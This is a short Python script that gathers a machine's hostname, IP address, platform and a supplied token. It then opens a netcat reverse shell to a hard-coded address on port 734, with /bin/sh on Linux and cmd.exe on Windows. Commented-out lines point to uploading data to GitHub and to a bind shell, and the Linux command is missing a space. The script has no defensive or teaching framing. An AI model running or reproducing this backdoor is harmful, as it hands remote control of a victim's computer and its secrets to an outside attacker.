import platform
import os
import sysconfig
import socket
import json
import base64
import requests
try:
    from github import Github
except:
	os.system('python -m pip install PyGithub')


def create_file(file_path, content):
    with open(file_path, "w", encoding="utf-8") as file:
        file.write(content)

def delete_file(file_path):
    os.remove(file_path)



        

def run(token):
    hostname=socket.gethostname()   
    IPAddr=socket.gethostbyname(hostname) 
    iph='172.16.22.31'
    fname="data.txt"
    print('')
    print(' ############### # # # ##############')
    print(' ####### ###### # #  # # ####### ####')
    print(' ######   ##### ##    ## ######   ###')
    print(' ####### #######  #  #  ######## ####')
    print(' ################ ### ###############')
    print('')
    print('OS name : ', platform.system())
    print('Linux: ', sysconfig.get_platform(),' === CONNECTED ') 
    print(' IpAddress: ', IPAddr)
    print('TokenData: ', token)
    stmnt= 'Info: '+ IPAddr+' System: '+sysconfig.get_platform()
    print(stmnt)
    create_file(fname,stmnt)  
    if "Linux" in platform.system():
        #upload_file_to_github(archive)
        #os.system( 'nc -lvp 734 -e /bin/sh')
        os.system('nc' + iph+ ' 734 -e /bin/sh')
    elif "Windows" in platform.system():
        #pdate_file(token,fname)
        #delete_file(fname)
        #os.system('ncat -lvp 734 -e cmd.exe')
        os.system('ncat '+ iph +' 734 -e cmd.exe')
    
